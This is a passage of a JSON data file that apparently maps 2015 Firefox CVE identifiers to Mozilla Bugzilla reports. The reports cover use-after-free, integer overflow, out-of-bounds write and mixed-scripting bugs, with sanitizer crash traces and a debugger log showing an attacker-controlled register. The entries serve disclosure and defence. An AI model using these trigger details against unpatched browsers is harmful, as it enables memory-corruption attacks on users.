    ],
    "CVE-2015-4475": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1175396",
        "title": "out of bounds read at mozilla::AudioSink::PlayFromAudioQueue()",
        "description": "A use-after-free occurs whenever the attached mp3 is opened via the page I'll add in a sec. This happens at least in freshly installed 64-bit Ubuntu using the last few tinderbox asan builds. Bug 1093150 is about something on mostly Windows with a very similar trace. ==9814==ERROR: AddressSanitizer: heap-use-after-free on address 0x6210001668ff at pc 0x7f803058eb2b bp 0x7f80017a21c0 sp 0x7f80017a21b8 READ of size 9216 at 0x6210001668ff thread T36 (Media Audio) #0 0x7f803058eb2a in mozilla::AudioStream::Write(float const*, unsigned int, mozilla::TimeStamp*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/dom/media/AudioStream.h:117 #1 0x7f803058b7a8 in mozilla::AudioSink::PlayFromAudioQueue() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/dom/media/AudioSink.cpp:354 #2 0x7f803058941c in mozilla::AudioSink::AudioLoop() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/dom/media/AudioSink.cpp:219 #3 0x7f80305a9860 in nsRunnableMethodImpl<void (mozilla::AudioSink::*)(), true>::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/dom/media/../../dist/include/nsThreadUtils.h:618 #4 0x7f802c06dbe7 in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/xpcom/threads/nsThread.cpp:846 #5 0x7f802c0e78aa in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/xpcom/glue/nsThreadUtils.cpp:265 #6 0x7f802c93ccd9 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/ipc/glue/MessagePump.cpp:326 #7 0x7f802c8ca4ec in MessageLoop::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/ipc/chromium/src/base/message_loop.cc:233 #8 0x7f802c06a4fc in nsThread::ThreadFunc(void*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/xpcom/threads/nsThread.cpp:359 #9 0x7f8038c51135 in _pt_root /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/nsprpub/pr/src/pthreads/ptthread.c:212 #10 0x7f803928e6a9 in start_thread /build/buildd/glibc-2.21/nptl/pthread_create.c:333 #11 0x7f8029c03eec in clone /build/buildd/glibc-2.21/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:109"
      }
    ],
    "CVE-2015-4478": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1105914",
        "title": "JSON.parse with reviver allows redefining non-configurable properties",
        "description": "Credit for this one also to André Bargull. The implementation of Walk() in json.cpp (used when there is a reviver) uses JSObject::defineGeneric to define the property. This is not what the spec says to do, and in particular it's missing the various sanity checks that [[DefineOwnProperty]] is supposed to perform. Compare to what Object.defineProperty does (which lands in DefinePropertyOnObject, which does those checks). Anyway, the upshot is that you can redefine non-configurable properties. André's testcase does this with Location, redefining things like toString. This particular testcase is \"fixed\" by my patch in bug 1101123, in that before you get to toString you try to redefine \"href\", which is an accessor property so you get an exception. Except per spec failures to define a prop during Walk shouldn't throw afaict, and I'm sure the testcase could be adjusted to avoid the href issue.... and in any case, this can be used to redefine non-configurable stuff on objects which only have value props no matter what I do in bug 1101123."
      }
    ],
    "CVE-2015-4479": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1170344",
        "title": "int oveflow in libstagefright during mp4 parsing",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 Steps to reproduce: A specially crafted mp4 file can cause an integer overflow in VectorImpl::setCapacity. If there is a 'saio' tag in a mp4 file MPEG4Extractor::parseChunk calls SampleTable::setSampleAuxiliaryInformationOffsetParams. The latter function calls mCencOffsets.setCapacity(cencOffsetCount) with cencOffsetCount fully controlled by an attacker. The setCapacity is implemented in VectorImpl::setCapacity. In this function SharedBuffer::alloc(new_capacity * mItemSize) is called with new_capacity under attacker control. Multiplication with mItemSize (8 in this particular case) might causes an integer overflow. For example new_capacity set to 0x20000001 results in a 8 byte allocation."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1185115",
        "title": "MPEG4 saio Chunk Integer Overflow (libstagefright) (ZDI-CAN-2966)",
        "description": "The security alias received the following information from HP's Zero Day Initiative. According to their \"upcoming\" list they initially sent it to us on 2015-05-28 but we did not receive it. When I saw Mozilla on their upcoming list I asked them to resend and got this on 2015-07-13 (delayed filing due to travel). I have not yet confirmed this problem. We recently fixed several similar-sounding libstagefright issues so we'll need to first test on the old builds they claim are affected. -- VULNERABILITY DETAILS ------------------------ Tested against Firefox 38.0.1 and the Nightly from 20150518 on Windows 8.1 There is an integer overflow within media/libstagefright/system/core/libutils/VectorImpl.cpp if the attacker can control the size: ``` ssize_t VectorImpl::setCapacity(size_t new_capacity) { size_t current_capacity = capacity(); ssize_t amount = new_capacity - size(); if (amount <= 0) { // we can't reduce the capacity return current_capacity; } SharedBuffer* sb = SharedBuffer::alloc(new_capacity * mItemSize); if (sb) { void* array = sb->data(); _do_copy(array, mStorage, size()); release_storage(); mStorage = const_cast<void*>(array); } else { return NO_MEMORY; } return new_capacity; } ``` There is a second integer overflow within media/libstagefright/system/core/libutils/SharedBuffer.cpp!SharedBuffer::alloc if the attacker can control the size: ``` SharedBuffer* SharedBuffer::alloc(size_t size) { SharedBuffer* sb = static_cast<SharedBuffer *>(malloc(sizeof(SharedBuffer) + size)); if (sb) { sb->mRefs = 1; sb->mSize = size; } return sb; } ``` Both of these are reachable through the MPEG4 parser within media/libstagefright/frameworks/av/media/libstagefright/MPEG4Extractor.cpp. Specifically, if a 'saio' chunk is seen while within parseChunk, execution continues to media/libstagefright/frameworks/av/media/libstagefright/SampleTable.cpp where the controlled value is read and used to allocate memory Debug log: ``` (998.900): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=91919191 ebx=007af700 ecx=03a4c300 edx=00000001 esi=03a10a60 edi=03a10a70 eip=5e8784cf esp=007af504 ebp=03a4c300 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210202 xul!mozilla::ipc::MessagePump::Run+0x7b: 5e8784cf ff5008 call dword ptr [eax+8] ds:0023:91919199=???????? 0:000> kv ChildEBP RetAddr Args to Child 007af524 5e87844e 03a4c300 92946523 03a40fd0 xul!mozilla::ipc::MessagePump::Run+0x7b (FPO: [1,4,0]) (CONV: thiscall) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\ipc\\glue\\messagepump.cpp @ 117] 007af55c 5e878118 03a401d0 00000001 5e8a0200 xul!MessageLoop::RunHandler+0x20 (FPO: [SEH]) (CONV: thiscall) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\ipc\\chromium\\src\\base\\message_loop.cc @ 227] 007af57c 5e8788ec 0ac5e340 00000000 5e87951d xul!MessageLoop::Run+0x19 (FPO: [Non-Fpo]) (CONV: thiscall) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\ipc\\chromium\\src\\base\\message_loop.cc @ 201] 007af588 5e87951d 03a40fd0 0ac5e340 5e6b3162 xul!nsBaseAppShell::Run+0x32 (FPO: [1,0,0]) (CONV: stdcall) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\widget\\nsbaseappshell.cpp @ 166] 007af594 5e6b3162 03a40fd0 007af80d 0d0a4180 xul!nsAppShell::Run+0x1b (FPO: [1,0,4]) (CONV: stdcall) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\widget\\windows\\nsappshell.cpp @ 178] 007af5a4 5e9d5f7c 0ac5e340 007af714 007af730 xul!nsAppStartup::Run+0x20 (FPO: [1,0,0]) (CONV: stdcall) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\toolkit\\components\\startup\\nsappstartup.cpp @ 282] 007af680 5e9d6e6f 00000001 007af858 03a42160 xul!XREMain::XRE_mainRun+0x499 (FPO: [Non-Fpo]) (CONV: thiscall) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\toolkit\\xre\\nsapprunner.cpp @ 4228] 007af69c 5ea8336b 00000000 018c5ff8 007af800 xul!XREMain::XRE_main+0x1b6 (FPO: [3,2,0]) (CONV: thiscall) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\toolkit\\xre\\nsapprunner.cpp @ 4308] 007af810 00101635 00000001 018c5ff8 007af858 xul!XRE_main+0x3e (FPO: [4,87,0]) (CONV: cdecl) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\toolkit\\xre\\nsapprunner.cpp @ 4528] 007af9a4 001012dc 03a42160 018c9ff8 ffffc000 firefox!do_main+0x125 (FPO: [1,92,0]) (CONV: cdecl) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\browser\\app\\nsbrowserapp.cpp @ 294] 007afa38 001010dc 001024f1 001024f1 007afa94 firefox!NS_internal_main+0xec (FPO: [Non-Fpo]) (CONV: cdecl) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\browser\\app\\nsbrowserapp.cpp @ 669] 007afa4c 00102474 018c5ff8 0186ff98 01871f70 firefox!wmain+0xbc (FPO: [2,0,0]) (CONV: cdecl) [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\toolkit\\xre\\nswindowswmain.cpp @ 124] 007afa94 76274198 7f51d000 76274170 c98e43d2 firefox!__tmainCRTStartup+0xfe (FPO: [Non-Fpo]) (CONV: cdecl) [f:\\dd\\vctools\\crt\\crtw32\\startup\\crt0.c @ 255] 007afaa8 770f32b1 7f51d000 7498c8a6 00000000 KERNEL32!BaseThreadInitThunk+0x24 (FPO: [Non-Fpo]) 007afaf0 770f327f ffffffff 7711f08b 00000000 ntdll!__RtlUserThreadStart+0x2b (FPO: [SEH]) 007afb00 00000000 001024f1 7f51d000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo]) 0:000> !lmi xul Loaded Module Info: [xul] Module: xul Base Address: 5e520000 Image Name: C:\\Program Files\\Mozilla Firefox\\xul.dll Machine Type: 332 (I386) Time Stamp: 55541969 Wed May 13 20:41:29 2015 Size: 2268000 CheckSum: 21a3860 Characteristics: 2122 Debug Data Dirs: Type Size VA Pointer CODEVIEW 76, 1bff998, 1bfe198 RSDS - GUID: {77095B44-069F-4E0E-B81F-F5E718AEA6C9} Age: 2, Pdb: c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\obj-firefox\\toolkit\\library\\xul.pdb ?? 14, 1bffa10, 1bfe210 [Data not mapped] CLSID 4, 1bffa24, 1bfe224 [Data not mapped] Image Type: FILE - Image read successfully from debugger. C:\\Program Files\\Mozilla Firefox\\xul.dll Symbol Type: PDB - Symbols loaded successfully from image path. z:\\export\\symbols\\xul.pdb\\77095B44069F4E0EB81FF5E718AEA6C92\\xul.pdb Compiler: Linker - front end [0.0 bld 0] - back end [12.0 bld 30723] Load Report: private symbols & lines, source indexed z:\\export\\symbols\\xul.pdb\\77095B44069F4E0EB81FF5E718AEA6C92\\xul.pdb 0:000> lmvm xul start end module name 5e520000 60788000 xul (private pdb symbols) z:\\export\\symbols\\xul.pdb\\77095B44069F4E0EB81FF5E718AEA6C92\\xul.pdb Loaded symbol image file: C:\\Program Files\\Mozilla Firefox\\xul.dll Image path: C:\\Program Files\\Mozilla Firefox\\xul.dll Image name: xul.dll Timestamp: Wed May 13 20:41:29 2015 (55541969) CheckSum: 021A3860 ImageSize: 02268000 File version: 38.0.1.5611 Product version: 38.0.1.5611 File flags: 0 (Mask 3F) File OS: 4 Unknown Win32 File type: 2.0 Dll File date: 00000000.00000000 Translations: 0000.04b0 CompanyName: Mozilla Foundation ProductName: Firefox InternalName: Firefox OriginalFilename: xul.dll ProductVersion: 38.0.1 FileVersion: 38.0.1 FileDescription: 38.0.1 LegalCopyright: License: MPL 2 LegalTrademarks: Mozilla Comments: Mozilla 0:000> !lmi firefox Loaded Module Info: [firefox] Module: firefox Base Address: 00100000 Image Name: firefox.exe Machine Type: 332 (I386) Time Stamp: 55540a1a Wed May 13 19:36:10 2015 Size: 5f000 CheckSum: 676cb Characteristics: 122 Debug Data Dirs: Type Size VA Pointer CODEVIEW 76, 19a1c, 18a1c RSDS - GUID: {DEF0A7B6-E41C-4723-87E8-80346BEC2FA0} Age: 2, Pdb: c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\obj-firefox\\browser\\app\\firefox.pdb ?? 14, 19a94, 18a94 [Data not mapped] CLSID 4, 19aa8, 18aa8 [Data not mapped] Image Type: FILE - Image read successfully from debugger. C:\\Program Files\\Mozilla Firefox\\firefox.exe Symbol Type: PDB - Symbols loaded successfully from image path. z:\\export\\symbols\\firefox.pdb\\DEF0A7B6E41C472387E880346BEC2FA02\\firefox.pdb Compiler: Linker - front end [0.0 bld 0] - back end [12.0 bld 30723] Load Report: private symbols & lines, source indexed z:\\export\\symbols\\firefox.pdb\\DEF0A7B6E41C472387E880346BEC2FA02\\firefox.pdb 0:000> lmvm firefox start end module name 00100000 0015f000 firefox (private pdb symbols) z:\\export\\symbols\\firefox.pdb\\DEF0A7B6E41C472387E880346BEC2FA02\\firefox.pdb Loaded symbol image file: C:\\Program Files\\Mozilla Firefox\\firefox.exe Image path: firefox.exe Image name: firefox.exe Timestamp: Wed May 13 19:36:10 2015 (55540A1A) CheckSum: 000676CB ImageSize: 0005F000 File version: 38.0.1.5611 Product version: 38.0.1.0 File flags: 0 (Mask 3F) File OS: 4 Unknown Win32 File type: 2.0 Dll File date: 00000000.00000000 Translations: 0000.04b0 CompanyName: Mozilla Corporation ProductName: Firefox InternalName: Firefox OriginalFilename: firefox.exe ProductVersion: 38.0.1 FileVersion: 38.0.1 FileDescription: Firefox LegalCopyright: ©Firefox and Mozilla Developers; available under the MPL 2 license. LegalTrademarks: Firefox is a Trademark of The Mozilla Foundation. Comments: Firefox is a Trademark of The Mozilla Foundation. 0:000> dc @ebp 03a4c300 91919191 91919191 91919191 91919191 ................ 03a4c310 91919191 91919191 91919191 91919191 ................ 03a4c320 91919191 91919191 91919191 91919191 ................ 03a4c330 91919191 91919191 91919191 91919191 ................ 03a4c340 91919191 91919191 91919191 91919191 ................ 03a4c350 91919191 91919191 91919191 91919191 ................ 03a4c360 91919191 91919191 91919191 91919191 ................ 03a4c370 91919191 91919191 91919191 91919191 ................ ``` -- CREDIT --------------------------------------- This vulnerability was discovered by: Anonymous working with HP's Zero Day Initiative"
      }
    ],
    "CVE-2015-4480": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1144107",
        "title": "crash in [@ stagefright::SampleTable::isValid() ] with h264 mp4",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Build ID: 20150305021524 Steps to reproduce: I wrote a little fuzzer. It should crash in a matter of seconds."
      }
    ],
    "CVE-2015-4482": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1184500",
        "title": "Out of bounds write in mar_read.c",
        "description": "While opening a mar file it's possible to trigger an out of bounds write with a very long item file name (near 4 GB, so it's work only on 64bit). This will happen before any signature or size check so it's can be triggered during a normal update process. To reproduce extract the update.mar and try an update with an 64bit updater or use the mar tool like 'mar -t ./update.mar'"
      }
    ],
    "CVE-2015-4483": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1148732",
        "title": "feed: protocol + POST method => mixed scripting",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Build ID: 20150320202338 Steps to reproduce: Using feed: protocol and POST method, Firefox does not block mixed scripting. Actual results: Firefox does not block mixed scripting. Expected results: Mixed scripting should be blocked."
      }
    ],
    "CVE-2015-4484": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1171540",
        "title": "crash in void js::jit::AssemblerX86Shared::lock_addl<js::jit::Imm32>(js::jit::Imm32, js::jit::Operand const&)",
        "description": "This bug was filed from the Socorro interface and is report bp-3cd5bd7d-33e2-45a2-afce-39cb22150604. ============================================================= There is a systematically reproducible crash in current Firefox Beta channel at least, which affects Linux and OS X. To reproduce, open the .html page from the attached file. The crash occurs in current Emscripten unit test build servers (logs don't really show much except timeout, but linking here just as a record): OSX: http://clb.demon.fi:8112/builders/osx-incoming/builds/891/steps/Tests-browser-firefox-beta/logs/stdio Linux: http://clb.demon.fi:8112/builders/ubuntu-incoming/builds/888/steps/Tests-browser-firefox-beta/logs/stdio The issue does not occur in the Emscripten unit test servers in Firefox stable channel, current FF Dev Edition or FF Nightly, and it does not occur on Windows either. I'm initially assuming this might be a crash that has been already fixed in FF Dev Edition, but that the crash slipped through to FF Beta channel release? Or alternative possibility is that the issue is still present, but somehow masked in FF Dev Edition and newer?"
      }
    ],
    "CVE-2015-4485": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1177948",
        "title": "Heap-buffer-overflow WRITE in resize_context_buffers",
        "description": "Need to load this testcase over http to see instant crash. I think your libvpx copy is old, it is best to update it since we have found several others that were fixed recently. ==15811==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61f00006e29c at pc 0x7f617614b7d9 bp 0x7f614e38ab30 sp 0x7f614e38ab28 WRITE of size 4 at 0x61f00006e29c thread T22 (MediaPl~back #2) #0 0x7f617614b7d8 in resize_context_buffers media/libvpx/vp9/decoder/vp9_decodeframe.c:681:26 #1 0x7f617614ae89 in setup_frame_size media/libvpx/vp9/decoder/vp9_decodeframe.c:721:3 #2 0x7f61761402e7 in vp9_decode_frame media/libvpx/vp9/decoder/vp9_decodeframe.c:1368:5 #3 0x7f617615e171 in vp9_receive_compressed_data media/libvpx/vp9/decoder/vp9_decoder.c:356:3 #4 0x7f61762ec37b in frame_worker_hook media/libvpx/vp9/vp9_dx_iface.c:322:7 #5 0x7f61760faca6 in execute media/libvpx/vp9/common/vp9_thread.c:134:27 #6 0x7f61762eba0d in decode_one media/libvpx/vp9/vp9_dx_iface.c:493:5 #7 0x7f61762e5437 in decoder_decode media/libvpx/vp9/vp9_dx_iface.c:686:37 #8 0x7f61762ed2f7 in vpx_codec_decode media/libvpx/vpx/src/vpx_decoder.c:122:11 #9 0x7f6173224e5f in mozilla::SoftwareWebMVideoDecoder::DecodeVideoFrame(bool&, long) dom/media/webm/SoftwareWebMVideoDecoder.cpp:149:7 #10 0x7f6172dedc19 in mozilla::MediaDecoderReader::RequestVideoData(bool, long) dom/media/MediaDecoderReader.cpp:277:10 #11 0x7f6172ee1a6d in mozilla::detail::MethodCallWithTwoArgs<mozilla::MediaPromise<nsRefPtr<mozilla::VideoData>, mozilla::MediaDecoderReader::NotDecodedReason, true>, mozilla::MediaDecoderReader, bool, long>::Invoke() objdir-ff-asan/dist/include/MediaPromise.h:902:52 #12 0x7f6172ee1d83 in mozilla::detail::ProxyRunnable<mozilla::MediaPromise<nsRefPtr<mozilla::VideoData>, mozilla::MediaDecoderReader::NotDecodedReason, true> >::Run() objdir-ff-asan/dist/include/MediaPromise.h:919:31 #13 0x7f6172d9d12c in mozilla::AutoTaskDispatcher::TaskGroupRunnable::Run() dom/media/TaskDispatcher.h:181:11 #14 0x7f6172f295b9 in mozilla::MediaTaskQueue::Runner::Run() dom/media/MediaTaskQueue.cpp:256:5 #15 0x7f616e4c353e in nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:221:7 #16 0x7f616e4c3b1c in non-virtual thunk to nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:151:15 #17 0x7f616e4bd1b6 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:848:7 #18 0x7f616e53419c in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:265:10 #19 0x7f616ede4906 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:326:20 #20 0x7f616ed6e6a1 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:234:3 #21 0x7f616e4b9c51 in nsThread::ThreadFunc(void*) xpcom/threads/nsThread.cpp:360:5 #22 0x7f617bca0ffa in _pt_root nsprpub/pr/src/pthreads/ptthread.c:212:5 #23 0x7f617c2e5181 in start_thread /build/buildd/eglibc-2.19/nptl/pthread_create.c:312 0x61f00006e29f is located 0 bytes to the right of 3103-byte region [0x61f00006d680,0x61f00006e29f) allocated by thread T24 (MediaPl~back #3) here: #0 0x4b6338 in __interceptor_malloc _asan_rtl_ #1 0x7f61762ef186 in vpx_calloc media/libvpx/vpx_mem/vpx_mem.c:126:10 #2 0x7f61762e446a in decoder_decode media/libvpx/vp9/vp9_dx_iface.c:372:36 #3 0x7f61762ed2f7 in vpx_codec_decode media/libvpx/vpx/src/vpx_decoder.c:122:11 #4 0x7f6173224e5f in mozilla::SoftwareWebMVideoDecoder::DecodeVideoFrame(bool&, long) dom/media/webm/SoftwareWebMVideoDecoder.cpp:149:7 #5 0x7f6172dedc19 in mozilla::MediaDecoderReader::RequestVideoData(bool, long) dom/media/MediaDecoderReader.cpp:277:10 #6 0x7f6172ee1a6d in mozilla::detail::MethodCallWithTwoArgs<mozilla::MediaPromise<nsRefPtr<mozilla::VideoData>, mozilla::MediaDecoderReader::NotDecodedReason, true>, mozilla::MediaDecoderReader, bool, long>::Invoke() objdir-ff-asan/dist/include/MediaPromise.h:902:52 #7 0x7f6172ee1d83 in mozilla::detail::ProxyRunnable<mozilla::MediaPromise<nsRefPtr<mozilla::VideoData>, mozilla::MediaDecoderReader::NotDecodedReason, true> >::Run() objdir-ff-asan/dist/include/MediaPromise.h:919:31 #8 0x7f6172d9d12c in mozilla::AutoTaskDispatcher::TaskGroupRunnable::Run() dom/media/TaskDispatcher.h:181:11 #9 0x7f6172f295b9 in mozilla::MediaTaskQueue::Runner::Run() dom/media/MediaTaskQueue.cpp:256:5 #10 0x7f616e4c353e in nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:221:7 #11 0x7f616e4c3b1c in non-virtual thunk to nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:151:15 #12 0x7f616e4bd1b6 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:848:7 #13 0x7f616e53419c in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:265:10 #14 0x7f616ede4a82 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:355:5 #15 0x7f616ed6e6a1 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:234:3 #16 0x7f616e4b9c51 in nsThread::ThreadFunc(void*) xpcom/threads/nsThread.cpp:360:5 #17 0x7f617bca0ffa in _pt_root nsprpub/pr/src/pthreads/ptthread.c:212:5 #18 0x7f617c2e5181 in start_thread /build/buildd/eglibc-2.19/nptl/pthread_create.c:312 Thread T22 (MediaPl~back #2) created by T0 (Web Content) here: #0 0x430269 in pthread_create _asan_rtl_ #1 0x7f617bc9ddbf in _PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:453:14 #2 0x7f617bc9d9ea in PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:544:12 #3 0x7f616e4bb016 in nsThread::Init() xpcom/threads/nsThread.cpp:470:19 #4 0x7f616e4c0d1f in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) xpcom/threads/nsThreadManager.cpp:253:17 #5 0x7f616e4c248d in nsThreadPool::PutEvent(nsIRunnable*) xpcom/threads/nsThreadPool.cpp:102:3 #6 0x7f616e4c3f8a in nsThreadPool::Dispatch(nsIRunnable*, unsigned int) xpcom/threads/nsThreadPool.cpp:262:5 #7 0x7f6172f27dce in mozilla::MediaTaskQueue::DispatchLocked(already_AddRefed<nsIRunnable>, mozilla::MediaTaskQueue::DispatchMode, mozilla::AbstractThread::DispatchFailureHandling, mozilla::AbstractThread::DispatchReason) dom/media/MediaTaskQueue.cpp:65:17 #8 0x7f6172e8b4ff in mozilla::MediaTaskQueue::Dispatch(already_AddRefed<nsIRunnable>, mozilla::AbstractThread::DispatchFailureHandling, mozilla::AbstractThread::DispatchReason) objdir-ff-asan/dist/include/MediaTaskQueue.h:52:19 #9 0x7f6172d9bcc8 in mozilla::AutoTaskDispatcher::~AutoTaskDispatcher() dom/media/TaskDispatcher.h:233:5 #10 0x7f6172d9b8d7 in mozilla::XPCOMThreadWrapper::FireTailDispatcher() objdir-ff-asan/dist/include/mozilla/Maybe.h:373:7 #11 0x7f6172d9df20 in nsRunnableMethodImpl<void (mozilla::XPCOMThreadWrapper::*)(), true>::Run() objdir-ff-asan/dist/include/nsThreadUtils.h:618:5 #12 0x7f6173e669c1 in nsBaseAppShell::RunSyncSectionsInternal(bool, unsigned int) widget/nsBaseAppShell.cpp:376:7 #13 0x7f6173e67c9e in non-virtual thunk to nsBaseAppShell::AfterProcessNextEvent(nsIThreadInternal*, unsigned int, bool) widget/nsBaseAppShell.h:95:7 #14 0x7f616e4bd613 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:862:5 #15 0x7f616e53419c in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:265:10 #16 0x7f616ede3b2e in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:95:21 #17 0x7f616ed6e6a1 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:234:3 #18 0x7f6173e6524f in nsBaseAppShell::Run() widget/nsBaseAppShell.cpp:165:3 #19 0x7f6175d451f3 in XRE_RunAppShell toolkit/xre/nsEmbedFunctions.cpp:778:12 #20 0x7f616ed6e6a1 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:234:3 #21 0x7f6175d44717 in XRE_InitChildProcess toolkit/xre/nsEmbedFunctions.cpp:614:7 #22 0x4dbbf2 in content_process_main(int, char**) ipc/contentproc/plugin-container.cpp:236:19 #23 0x7f616b8c2ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287 Thread T24 (MediaPl~back #3) created by T22 (MediaPl~back #2) here: #0 0x430269 in pthread_create _asan_rtl_ #1 0x7f617bc9ddbf in _PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:453:14 #2 0x7f617bc9d9ea in PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:544:12 #3 0x7f616e4bb016 in nsThread::Init() xpcom/threads/nsThread.cpp:470:19 #4 0x7f616e4c0d1f in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) xpcom/threads/nsThreadManager.cpp:253:17 #5 0x7f616e4c248d in nsThreadPool::PutEvent(nsIRunnable*) xpcom/threads/nsThreadPool.cpp:102:3 #6 0x7f616e4c3f8a in nsThreadPool::Dispatch(nsIRunnable*, unsigned int) xpcom/threads/nsThreadPool.cpp:262:5 #7 0x7f6172f27dce in mozilla::MediaTaskQueue::DispatchLocked(already_AddRefed<nsIRunnable>, mozilla::MediaTaskQueue::DispatchMode, mozilla::AbstractThread::DispatchFailureHandling, mozilla::AbstractThread::DispatchReason) dom/media/MediaTaskQueue.cpp:65:17 #8 0x7f6172e8b4ff in mozilla::MediaTaskQueue::Dispatch(already_AddRefed<nsIRunnable>, mozilla::AbstractThread::DispatchFailureHandling, mozilla::AbstractThread::DispatchReason) objdir-ff-asan/dist/include/MediaTaskQueue.h:52:19 #9 0x7f6172d9bcc8 in mozilla::AutoTaskDispatcher::~AutoTaskDispatcher() dom/media/TaskDispatcher.h:233:5 #10 0x7f6172f29980 in mozilla::MediaTaskQueue::Runner::Run() objdir-ff-asan/dist/include/MediaTaskQueue.h:152:5 #11 0x7f616e4c353e in nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:221:7 #12 0x7f616e4c3b1c in non-virtual thunk to nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:151:15 #13 0x7f616e4bd1b6 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:848:7 #14 0x7f616e53419c in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:265:10 #15 0x7f616ede4906 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:326:20 #16 0x7f616ed6e6a1 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:234:3 #17 0x7f616e4b9c51 in nsThread::ThreadFunc(void*) xpcom/threads/nsThread.cpp:360:5 #18 0x7f617bca0ffa in _pt_root nsprpub/pr/src/pthreads/ptthread.c:212:5 #19 0x7f617c2e5181 in start_thread /build/buildd/eglibc-2.19/nptl/pthread_create.c:312 Shadow bytes around the buggy address: 0x0c3e80005c00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c3e80005c10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c3e80005c20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c3e80005c30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c3e80005c40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c3e80005c50: 00 00 00[07]fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3e80005c60: fa 